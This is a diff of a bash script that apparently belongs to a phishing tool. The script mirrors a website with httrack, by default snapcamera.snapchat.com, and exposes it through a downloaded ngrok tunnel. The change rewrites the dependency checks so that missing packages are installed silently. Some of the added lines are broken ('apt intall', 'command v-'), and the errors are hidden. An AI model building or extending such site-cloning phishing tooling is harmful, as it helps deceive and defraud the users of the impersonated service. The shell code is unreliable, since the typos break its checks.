@@ -41,9 +41,14 @@ exit 1
 
 dependencies() {
 
+printf "\e[1;92m Wait a moment...\e[0m\n\n"
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it.(apt install php) Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || apt intall php > /dev/null 2>&1 || apt-get install php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed.\n"; exit 1; }
+command v- unzip  > /dev/null 2>&1 || apt intall unzip > /dev/null 2>&1 || sudo apt-get install unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed.\n"; exit 1; }
+command -v wget  > /dev/null 2>&1 || apt intall wget > /dev/null 2>&1 || sudo apt-get install wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed.\n"; exit 1;}
+command v- httrack > /dev/null 2>&1 || apt-get install httrack > /dev/null 2>&1 || sudo apt-get install httrack > /dev/null 2>&1 || { echo >&2 "I require httrack but it's not installed.\n"; exit 1; }
 
+clear
 
 }
 
@@ -92,8 +97,6 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it(apt install unzip). Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -173,7 +176,6 @@ read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
-command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: (apt-get install httrack) "; exit 1; }
 default_website_mirror="https://snapcamera.snapchat.com"
 printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror
 read website_mirror
@@ -233,6 +235,6 @@ fi
 }
 
 
-banner
 dependencies
+banner
 start
